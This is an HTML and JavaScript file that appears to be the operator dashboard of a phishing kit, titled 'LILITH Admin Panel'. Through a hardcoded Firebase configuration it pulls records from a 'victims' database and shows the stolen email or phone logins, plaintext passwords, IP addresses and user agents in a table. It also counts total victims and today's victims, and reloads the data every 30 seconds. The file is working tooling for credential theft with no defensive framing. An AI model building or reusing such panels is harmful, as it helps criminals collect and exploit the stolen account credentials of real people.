<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🩸 LILITH - Admin Panel</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #ff0000;
            padding: 20px;
            min-height: 100vh;
        }
        h1 {
            text-align: center;
            color: #ff0000;
            border-bottom: 2px solid #330000;
            padding-bottom: 15px;
            margin-bottom: 20px;
            text-shadow: 0 0 10px #ff0000;
        }
        .stats {
            display: flex;
            gap: 20px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .stat-box {
            background: #111;
            border: 1px solid #330000;
            padding: 15px;
            border-radius: 8px;
            flex: 1;
            min-width: 150px;
            text-align: center;
        }
        .stat-box .number {
            font-size: 36px;
            color: #ff0000;
            font-weight: bold;
        }
        .stat-box .label {
            color: #666;
            font-size: 12px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            background: #111;
            border: 1px solid #330000;
        }
        th {
            background: #1a0000;
            color: #ff0000;
            padding: 12px;
            text-align: left;
            border-bottom: 2px solid #330000;
        }
        td {
            padding: 10px 12px;
            border-bottom: 1px solid #1a1a1a;
            color: #ccc;
            font-size: 13px;
        }
        tr:hover { background: #1a0000; }
        .password { color: #ff0000; font-weight: bold; }
        .ip { color: #ff6600; }
        .time { color: #666; font-size: 11px; }
        .refresh-btn {
            background: #330000;
            color: #ff0000;
            border: 1px solid #660000;
            padding: 10px 20px;
            cursor: pointer;
            margin-bottom: 20px;
            font-family: 'Courier New', monospace;
        }
        .refresh-btn:hover { background: #440000; }
        .empty {
            text-align: center;
            padding: 50px;
            color: #666;
        }
    </style>
</head>
<body>
    <h1>🩸 LILITH ADMIN PANEL</h1>
    
    <button class="refresh-btn" onclick="loadData()">🔄 Refresh Data</button>
    
    <div class="stats">
        <div class="stat-box">
            <div class="number" id="totalVictims">0</div>
            <div class="label">TOTAL VICTIMS</div>
        </div>
        <div class="stat-box">
            <div class="number" id="todayVictims">0</div>
            <div class="label">TODAY</div>
        </div>
    </div>
    
    <table>
        <thead>
            <tr>
                <th>#</th>
                <th>Email/Phone</th>
                <th>Password</th>
                <th>IP Address</th>
                <th>User Agent</th>
                <th>Time</th>
            </tr>
        </thead>
        <tbody id="victimTable">
            <tr><td colspan="6" class="empty">Loading...</td></tr>
        </tbody>
    </table>

    <script>
        // ═══════════════════════
        // FIREBASE CONFIG
        // ═══════════════════════
        const firebaseConfig = {
            apiKey: "AIzaSyBs9TiMKOoMaIb84RVowQFrGlELAZ_SFSI",
            authDomain: "rhfzero-d95f5.firebaseapp.com",
            databaseURL: "https://rhfzero-d95f5-default-rtdb.firebaseio.com",
            projectId: "rhfzero-d95f5",
            storageBucket: "rhfzero-d95f5.firebasestorage.app",
            messagingSenderId: "198495096060",
            appId: "1:198495096060:web:d368e1531d0d86321f5b79"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // ═══════════════════════
        // LOAD DATA
        // ═══════════════════════
        function loadData() {
            db.ref('victims').on('value', function(snapshot) {
                const data = snapshot.val();
                const tableBody = document.getElementById('victimTable');
                
                if (!data) {
                    tableBody.innerHTML = '<tr><td colspan="6" class="empty">🩸 No victims yet...</td></tr>';
                    document.getElementById('totalVictims').textContent = '0';
                    document.getElementById('todayVictims').textContent = '0';
                    return;
                }
                
                const victims = Object.values(data).reverse();
                const today = new Date().toISOString().split('T')[0];
                const todayCount = victims.filter(v => v.timestamp && v.timestamp.startsWith(today)).length;
                
                document.getElementById('totalVictims').textContent = victims.length;
                document.getElementById('todayVictims').textContent = todayCount;
                
                let html = '';
                victims.forEach(function(v, index) {
                    html += `
                        <tr>
                            <td>${index + 1}</td>
                            <td>${v.email || '-'}</td>
                            <td class="password">${v.password || '-'}</td>
                            <td class="ip">${v.ip || '-'}</td>
                            <td>${(v.userAgent || '').substring(0, 50)}...</td>
                            <td class="time">${v.timestamp || '-'}</td>
                        </tr>
                    `;
                });
                
                tableBody.innerHTML = html;
            });
        }

        // Load otomatis
        loadData();
        
        // Refresh tiap 30 detik
        setInterval(loadData, 30000);
    </script>
</body>
</html>
